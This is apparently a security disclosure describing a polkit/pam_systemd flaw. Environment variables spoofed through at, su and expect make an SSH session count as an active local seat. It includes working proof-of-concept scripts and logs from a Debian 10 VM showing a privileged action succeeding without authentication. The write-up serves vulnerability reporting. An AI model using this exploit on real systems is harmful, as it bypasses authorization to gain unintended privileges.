@@ -1,0 +1,243 @@
+As documented at
+<https://www.freedesktop.org/software/polkit/docs/latest/polkit.8.html>, for
+any action, a polkit policy can specify separate levels of required
+authentication based on whether a client is:
+
+ - in an active session on a local console
+ - in an inactive session on a local console
+ - or neither
+
+This is expressed in the policy using the elements "allow_any",
+"allow_inactive" and "allow_active". Very roughly speaking, the idea here is
+to give special privileges to processes owned by users that are sitting
+physically in front of the machine (or at least, a keyboard and a screen that
+are connected to a machine), and restrict processes that e.g. belong to users
+that are ssh'ing into a machine.
+
+For example, the ability to refresh the system's package index is restricted
+this way using a policy in
+/usr/share/polkit-1/actions/org.freedesktop.packagekit.policy:
+
+  <action id="org.freedesktop.packagekit.system-sources-refresh">
+[...]
+    <description>Refresh system repositories</description>
+[...]
+    <message>Authentication is required to refresh the system repositories</message>
+[...]
+    <defaults>
+      <allow_any>auth_admin</allow_any>
+      <allow_inactive>auth_admin</allow_inactive>
+      <allow_active>yes</allow_active>
+    </defaults>
+  </action>
+
+
+On systems that use systemd-logind, polkit determines whether a session is
+associated with a local console by checking whether systemd-logind is tracking
+the session as being associated with a "seat". This happens through
+polkit_backend_session_monitor_is_session_local() in
+polkitbackendsessionmonitor-systemd.c, which calls sd_session_get_seat().
+The check whether a session is active works similarly.
+
+systemd-logind is informed about the creation of new sessions by the PAM
+module pam_systemd through a systemd message bus call from
+pam_sm_open_session() to method_create_session(). The RPC method trusts the
+information supplied to it, apart from some consistency checks; that is not
+directly a problem, since this RPC method can only be invoked by root.
+This means that the PAM module needs to ensure that it doesn't pass incorrect
+data to systemd-logind.
+
+Looking at the code in the PAM module, however, you can see that the seat name
+of the session and the virtual terminal number come from environment
+variables:
+
+        seat = getenv_harder(handle, "XDG_SEAT", NULL);
+        cvtnr = getenv_harder(handle, "XDG_VTNR", NULL);
+        type = getenv_harder(handle, "XDG_SESSION_TYPE", type_pam);
+        class = getenv_harder(handle, "XDG_SESSION_CLASS", class_pam);
+        desktop = getenv_harder(handle, "XDG_SESSION_DESKTOP", desktop_pam);
+
+This is actually documented at
+<https://www.freedesktop.org/software/systemd/man/pam_systemd.html#Environment>.
+
+After some fixup logic that is irrelevant here, this data is then passed to
+the RPC method.
+
+
+One quirk of this issue is that a new session is only created if the calling
+process is not already part of a session (based on the cgroups it is in,
+parsed from procfs). This means that an attacker can't simply ssh into a
+machine, set some environment variables, and then invoke a setuid binary that
+uses PAM (such as "su") because ssh already triggers creation of a session via
+PAM. But as it turns out, the systemd PAM module is only invoked for
+interactive sessions:
+
+# cat /usr/share/pam-configs/systemd
+Name: Register user sessions in the systemd control group hierarchy
+Default: yes
+Priority: 0
+Session-Interactive-Only: yes
+Session-Type: Additional
+Session:
+    optional pam_systemd.so
+
+So, under the following assumptions:
+
+ - we can run commands on the remote machine, e.g. via SSH
+ - our account can be used with "su" (it has a password and isn't disabled)
+ - the machine has no X server running and is currently displaying tty1, with
+   a login prompt
+
+we can have our actions checked against the "allow_active" policies instead of
+the "allow_any" policies as follows:
+
+ - SSH into the machine
+ - use "at" to schedule a job in one minute that does the following:
+   * wipe the environment
+   * set XDG_SEAT=seat0 and XDG_VTNR=1
+   * use "expect" to run "su -c {...} {our_username}" and enter our user's
+     password
+   * in the shell invoked by "su", perform the action we want to run under the
+     "allow_active" policy
+
+
+I tested this in a Debian 10 VM, as follows ("{{{...}}}" have been replaced),
+after ensuring that no sessions are active and the VM's screen is showing the
+login prompt on tty1; all following commands are executed over SSH:
+
+
+=====================================================================
+normal_user@deb10:~$ cat session_outer.sh 
+#!/bin/sh
+echo "===== OUTER TESTING PKCON" >/tmp/atjob.log
+pkcon refresh -p </dev/null >>/tmp/atjob.log
+env -i /home/normal_user/session_middle.sh
+normal_user@deb10:~$ cat session_middle.sh 
+#!/bin/sh
+export XDG_SEAT=seat0
+export XDG_VTNR=1
+
+echo "===== ENV DUMP =====" > /tmp/atjob.log
+env >> /tmp/atjob.log
+
+echo "===== SESSION_OUTER =====" >> /tmp/atjob.log
+cat /proc/self/cgroup >> /tmp/atjob.log
+
+echo "===== OUTER LOGIN STATE =====" >> /tmp/atjob.log
+loginctl --no-ask-password >> /tmp/atjob.log
+
+echo "===== MIDDLE TESTING PKCON" >>/tmp/atjob.log
+pkcon refresh -p </dev/null >>/tmp/atjob.log
+
+/home/normal_user/runsu.expect
+
+echo "=========================" >> /tmp/atjob.log
+normal_user@deb10:~$ cat runsu.expect 
+#!/usr/bin/expect
+spawn /bin/su -c "/home/normal_user/session_inner.sh" normal_user
+expect "Password: "
+send "{{{PASSWORD}}}\n"
+expect eof
+
+normal_user@deb10:~$ cat session_inner.sh 
+#!/bin/sh
+echo "===== INNER LOGIN STATE =====" >> /tmp/atjob.log
+loginctl --no-ask-password >> /tmp/atjob.log
+
+echo "===== SESSION_INNER =====" >> /tmp/atjob.log
+cat /proc/self/cgroup >> /tmp/atjob.log
+
+echo "===== INNER TESTING PKCON" >>/tmp/atjob.log
+pkcon refresh -p </dev/null >>/tmp/atjob.log
+
+normal_user@deb10:~$ loginctl
+SESSION  UID USER        SEAT TTY  
+      7 1001 normal_user      pts/0
+
+1 sessions listed.
+normal_user@deb10:~$ pkcon refresh -p </dev/null
+Transaction:	Refreshing cache
+Status: 	Waiting in queue
+Status: 	Waiting for authentication
+Status: 	Finished
+Results:
+Fatal error: Failed to obtain authentication.
+normal_user@deb10:~$ at -f /home/normal_user/session_outer.sh {{{TIME}}}
+warning: commands will be executed using /bin/sh
+job 25 at {{{TIME}}}
+{{{ wait here until specified time has been reached, plus time for the job to finish running}}}
+normal_user@deb10:~$ cat /tmp/atjob.log 
+===== ENV DUMP =====
+XDG_SEAT=seat0
+XDG_VTNR=1
+PWD=/home/normal_user
+===== SESSION_OUTER =====
+10:memory:/system.slice/atd.service
+9:freezer:/
+8:pids:/system.slice/atd.service
+7:perf_event:/
+6:devices:/system.slice/atd.service
+5:net_cls,net_prio:/
+4:cpuset:/
+3:blkio:/
+2:cpu,cpuacct:/
+1:name=systemd:/system.slice/atd.service
+0::/system.slice/atd.service
+===== OUTER LOGIN STATE =====
+SESSION  UID USER        SEAT TTY  
+      7 1001 normal_user      pts/0
+
+1 sessions listed.
+===== MIDDLE TESTING PKCON
+Transaction:	Refreshing cache
+Status: 	Waiting in queue
+Status: 	Waiting for authentication
+Status: 	Finished
+Results:
+Fatal error: Failed to obtain authentication.
+===== INNER LOGIN STATE =====
+SESSION  UID USER        SEAT  TTY  
+     18 1001 normal_user seat0 pts/1
+      7 1001 normal_user       pts/0
+
+2 sessions listed.
+===== SESSION_INNER =====
+10:memory:/user.slice/user-1001.slice/session-18.scope
+9:freezer:/
+8:pids:/user.slice/user-1001.slice/session-18.scope
+7:perf_event:/
+6:devices:/user.slice
+5:net_cls,net_prio:/
+4:cpuset:/
+3:blkio:/
+2:cpu,cpuacct:/
+1:name=systemd:/user.slice/user-1001.slice/session-18.scope
+0::/user.slice/user-1001.slice/session-18.scope
+===== INNER TESTING PKCON
+Transaction:	Refreshing cache
+Status: 	Waiting in queue
+Status: 	Waiting for authentication
+Status: 	Waiting in queue
+Status: 	Starting
+Status: 	Loading cache
+Percentage:	0
+Percentage:	50
+Percentage:	100
+Percentage:	0
+Percentage:	50
+Percentage:	100
+Status: 	Refreshing software list
+Status: 	Downloading packages
+Percentage:	0
+Status: 	Running
+Status: 	Loading cache
+Percentage:	100
+Status: 	Finished
+Results:
+ Enabled                              http://ftp.ch.debian.org/debian buster InRelease
+ Enabled                              http://security.debian.org/debian-security buster/updates InRelease
+ Enabled                              http://debug.mirrors.debian.org/debian-debug buster-debug InRelease
+=========================
+You have new mail in /var/mail/normal_user
+normal_user@deb10:~$ 
+=====================================================================
